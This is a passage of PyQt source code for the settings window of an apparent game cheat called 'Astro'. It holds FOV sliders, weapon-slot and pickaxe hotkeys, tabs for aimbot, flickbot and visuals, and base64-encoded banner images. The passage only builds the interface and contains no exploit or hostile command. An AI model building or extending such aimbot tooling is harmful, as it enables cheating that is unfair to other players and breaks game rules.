        self.slider_slot4.setStyleSheet(self.get_slider_style())
        self.slider_slot4.setMaximumWidth(80)
        self.slider_slot4.setMinimumWidth(80)
        self.slider_slot4.setFocusPolicy(Qt.NoFocus)
        self.slider_slot4.setMinimum(120)
        self.slider_slot4.setMaximum(800)
        self.slider_slot4.setValue(int(round(Fov_Size_Slot4)))

        self.Fov_Size_label_slot5 = QLabel(f"FOV: {str(Fov_Size_Slot5)}")
        self.slider_slot5 = QSlider(Qt.Horizontal)
        self.slider_slot5.setStyleSheet(self.get_slider_style())
        self.slider_slot5.setMaximumWidth(80)
        self.slider_slot5.setMinimumWidth(80)
        self.slider_slot5.setFocusPolicy(Qt.NoFocus)
        self.slider_slot5.setMinimum(120)
        self.slider_slot5.setMaximum(800)
        self.slider_slot5.setValue(int(round(Fov_Size_Slot5)))

        key_name_converted_slot1 = KEY_NAMES.get(Slot1_Keybind, f"0x{Slot1_Keybind:02X}")
        self.hotkey_label_slot1 = QLabel("Slot 1")
        is_selecting_hotkey_slot1 = False
        self.btn_hotkey_slot1 = QPushButton(f"{key_name_converted_slot1}")
        self.btn_hotkey_slot1.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey_slot1.setStyleSheet(self.get_button_style())
        self.btn_hotkey_slot1.setMinimumWidth(40)
        self.btn_hotkey_slot1.clicked.connect(self.start_select_hotkey_slot1)

        key_name_converted_slot2 = KEY_NAMES.get(Slot2_Keybind, f"0x{Slot2_Keybind:02X}")
        self.hotkey_label_slot2 = QLabel("Slot 2")
        is_selecting_hotkey_slot2 = False
        self.btn_hotkey_slot2 = QPushButton(f"{key_name_converted_slot2}")
        self.btn_hotkey_slot2.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey_slot2.setStyleSheet(self.get_button_style())
        self.btn_hotkey_slot2.setMinimumWidth(40)
        self.btn_hotkey_slot2.clicked.connect(self.start_select_hotkey_slot2)

        key_name_converted_slot3 = KEY_NAMES.get(Slot3_Keybind, f"0x{Slot3_Keybind:02X}")
        self.hotkey_label_slot3 = QLabel("Slot 3")
        is_selecting_hotkey_slot3 = False
        self.btn_hotkey_slot3 = QPushButton(f"{key_name_converted_slot3}")
        self.btn_hotkey_slot3.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey_slot3.setStyleSheet(self.get_button_style())
        self.btn_hotkey_slot3.setMinimumWidth(40)
        self.btn_hotkey_slot3.clicked.connect(self.start_select_hotkey_slot3)

        key_name_converted_slot4 = KEY_NAMES.get(Slot4_Keybind, f"0x{Slot4_Keybind:02X}")
        self.hotkey_label_slot4 = QLabel("Slot 4")
        is_selecting_hotkey_slot4 = False
        self.btn_hotkey_slot4 = QPushButton(f"{key_name_converted_slot4}")
        self.btn_hotkey_slot4.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey_slot4.setStyleSheet(self.get_button_style())
        self.btn_hotkey_slot4.setMinimumWidth(40)
        self.btn_hotkey_slot4.clicked.connect(self.start_select_hotkey_slot4)

        key_name_converted_slot5 = KEY_NAMES.get(Slot5_Keybind, f"0x{Slot5_Keybind:02X}")
        self.hotkey_label_slot5 = QLabel("Slot 5")
        is_selecting_hotkey_slot5 = False
        self.btn_hotkey_slot5 = QPushButton(f"{key_name_converted_slot5}")
        self.btn_hotkey_slot5.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey_slot5.setStyleSheet(self.get_button_style())
        self.btn_hotkey_slot5.setMinimumWidth(40)
        self.btn_hotkey_slot5.clicked.connect(self.start_select_hotkey_slot5)

        key_name_converted_slot6 = KEY_NAMES.get(Slot6_Keybind, f"0x{Slot6_Keybind:02X}")
        self.hotkey_label_slot6 = QLabel("Pickaxe  ")
        is_selecting_hotkey_slot6 = False
        self.btn_hotkey_slot6 = QPushButton(f"{key_name_converted_slot6}")
        self.btn_hotkey_slot6.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey_slot6.setStyleSheet(self.get_button_style())
        self.btn_hotkey_slot6.setMinimumWidth(40)
        self.btn_hotkey_slot6.clicked.connect(self.start_select_hotkey_slot6)

        button_container = QWidget()
        button_container_layout = QHBoxLayout(button_container)
        btn_aimbot = QPushButton()
        btn_aimbot.setObjectName("menu_tab_aimbot")
        btn_aimbot.setIcon(QIcon(f"C:\\ProgramData\\Astro\\Assets\\Images\\skull.png"))
        btn_aimbot.setIconSize(QSize(19, 19))
        btn_aimbot.setFocusPolicy(Qt.NoFocus)
        btn_aimbot.setStyleSheet(self.menu_tab_selected_style())
        btn_slots = QPushButton()
        btn_slots.setObjectName("menu_tab_slots")
        btn_slots.setIcon(QIcon(f"C:\\ProgramData\\Astro\\Assets\\Images\\gun.png"))
        btn_slots.setIconSize(QSize(21, 21))
        btn_slots.setFocusPolicy(Qt.NoFocus)
        btn_slots.setStyleSheet(menu_tab_style)
        btn_flickbot = QPushButton()
        btn_flickbot.setIcon(QIcon(f"C:\\ProgramData\\Astro\\Assets\\Images\\bullet.png"))
        btn_flickbot.setIconSize(QSize(19, 19))
        btn_flickbot.setObjectName("menu_tab_flickbot")
        btn_flickbot.setFocusPolicy(Qt.NoFocus)
        btn_flickbot.setStyleSheet(menu_tab_style)
        btn_visual = QPushButton()
        btn_visual.setObjectName("menu_tab_visual")
        btn_visual.setIcon(QIcon(f"C:\\ProgramData\\Astro\\Assets\\Images\\view.png"))
        btn_visual.setIconSize(QSize(20, 20))
        btn_visual.setFocusPolicy(Qt.NoFocus)
        btn_visual.setStyleSheet(menu_tab_style)
        btn_extra = QPushButton()
        btn_extra.setIcon(QIcon(f"C:\\ProgramData\\Astro\\Assets\\Images\\application.png"))
        btn_extra.setIconSize(QSize(19, 19))
        btn_extra.setObjectName("menu_tab_extra")
        btn_extra.setFocusPolicy(Qt.NoFocus)
        btn_extra.setStyleSheet(menu_tab_style)
        btn_profile = QPushButton()
        btn_profile.setIcon(QIcon(f"C:\\ProgramData\\Astro\\Assets\\Images\\profile.png"))
        btn_profile.setIconSize(QSize(19, 19))
        btn_profile.setObjectName("menu_tab_profile")
        btn_profile.setFocusPolicy(Qt.NoFocus)
        btn_profile.setStyleSheet(menu_tab_style)
        btn_advanced = QPushButton()
        btn_advanced.setIcon(QIcon(f"C:\\ProgramData\\Astro\\Assets\\Images\\brain.png"))
        btn_advanced.setIconSize(QSize(19, 19))
        btn_advanced.setObjectName("menu_tab_advanced")
        btn_advanced.setFocusPolicy(Qt.NoFocus)
        btn_advanced.setStyleSheet(menu_tab_style)
        btn_config = QPushButton()
        btn_config.setIcon(QIcon(f"C:\\ProgramData\\Astro\\Assets\\Images\\gear.png"))
        btn_config.setIconSize(QSize(20, 20))
        btn_config.setObjectName("menu_tab_advanced")
        btn_config.setFocusPolicy(Qt.NoFocus)
        btn_config.setStyleSheet(menu_tab_style)
        button_container_layout.addWidget(btn_aimbot)
        button_container_layout.addWidget(btn_slots)
        button_container_layout.addWidget(btn_flickbot)
        button_container_layout.addWidget(btn_visual)
        button_container_layout.addWidget(btn_extra)
        button_container_layout.addWidget(btn_profile)
        button_container_layout.addWidget(btn_advanced)
        #button_container_layout.addWidget(btn_config)
        button_container_layout.setContentsMargins(0, 0, 0, 2)
        self.update_menu_tab_style()

        separator_line = QFrame()
        separator_line.setStyleSheet("background-color: #2c2c2c; height: 1px;")
        separator_line.setFrameShape(QFrame.HLine)
        separator_line.setFrameShadow(QFrame.Sunken)
        separator_line1 = QFrame()
        separator_line1.setStyleSheet("background-color: #393939; height: 1px;")
        separator_line1.setFrameShape(QFrame.HLine)
        separator_line1.setFrameShadow(QFrame.Sunken)
        separator_line2 = QFrame()
        separator_line2.setStyleSheet("background-color: #2c2c2c; height: 1px;")
        separator_line2.setFrameShape(QFrame.HLine)
        separator_line2.setFrameShadow(QFrame.Sunken)
        separator_line3 = QFrame()
        separator_line3.setStyleSheet("background-color: #393939; height: 1px;")
        separator_line3.setFrameShape(QFrame.HLine)
        separator_line3.setFrameShadow(QFrame.Sunken)
        separator_line4 = QFrame()
        separator_line4.setStyleSheet("background-color: #2c2c2c; height: 1px;")
        separator_line4.setFrameShape(QFrame.HLine)
        separator_line4.setFrameShadow(QFrame.Sunken)
        separator_line5 = QFrame()
        separator_line5.setStyleSheet("background-color: #393939; height: 1px;")
        separator_line5.setFrameShape(QFrame.HLine)
        separator_line5.setFrameShadow(QFrame.Sunken)
        separator_line6 = QFrame()
        separator_line6.setStyleSheet("background-color: #2c2c2c; height: 1px;")
        separator_line6.setFrameShape(QFrame.HLine)
        separator_line6.setFrameShadow(QFrame.Sunken)
        separator_line7 = QFrame()
        separator_line7.setStyleSheet("background-color: #393939; height: 1px;")
        separator_line7.setFrameShape(QFrame.HLine)
        separator_line7.setFrameShadow(QFrame.Sunken)
        separator_line8 = QFrame()
        separator_line8.setStyleSheet("background-color: #393939; height: 1px;")
        separator_line8.setFrameShape(QFrame.HLine)
        separator_line8.setFrameShadow(QFrame.Sunken)
        separator_line9 = QFrame()
        separator_line9.setStyleSheet("background-color: #2c2c2c; height: 1px;")
        separator_line9.setFrameShape(QFrame.HLine)
        separator_line9.setFrameShadow(QFrame.Sunken)

        separator_line10 = QFrame()
        separator_line10.setStyleSheet("background-color: #393939; height: 1px;")
        separator_line10.setFrameShape(QFrame.HLine)
        separator_line10.setFrameShadow(QFrame.Sunken)

        separator_line11 = QFrame()
        separator_line11.setStyleSheet("background-color: #393939; height: 1px;")
        separator_line11.setFrameShape(QFrame.HLine)
        separator_line11.setFrameShadow(QFrame.Sunken)

        separator_line12 = QFrame()
        separator_line12.setStyleSheet("background-color: #2c2c2c; height: 1px;")
        separator_line12.setFrameShape(QFrame.HLine)
        separator_line12.setFrameShadow(QFrame.Sunken)

        separator_line13 = QFrame()
        separator_line13.setStyleSheet("background-color: #2c2c2c; height: 1px;")
        separator_line13.setFrameShape(QFrame.HLine)
        separator_line13.setFrameShadow(QFrame.Sunken)

        separator_line14 = QFrame()
        separator_line14.setStyleSheet("background-color: #2c2c2c; height: 1px;")
        separator_line14.setFrameShape(QFrame.HLine)
        separator_line14.setFrameShadow(QFrame.Sunken)

        # Create the banner layout
        banner_layout = QVBoxLayout()
        self.bannerdd = QLabel(self)
        image_files = [
            
            #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